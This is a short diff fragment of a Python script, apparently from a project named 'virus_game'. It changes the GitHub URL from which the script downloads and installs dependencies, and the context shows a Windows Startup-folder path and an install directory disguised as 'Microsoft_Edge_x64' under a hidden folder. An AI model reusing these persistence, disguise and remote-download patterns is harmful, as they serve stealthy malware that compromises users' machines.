@@ -81,7 +81,7 @@ def main():
     shell_startup_dir = os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
     virus_dir = os.path.join(home_dir, ".temp", "Microsoft_Edge_x64", "utils")
 
-    repo_base_url = "https://raw.githubusercontent.com/Hacaric/virus_game/refs/heads/main/"
+    repo_base_url = "https://raw.githubusercontent.com/Hacaric/virus_game/main/"
 
     if install_dependencies:
         # Download dependencies file and install packages
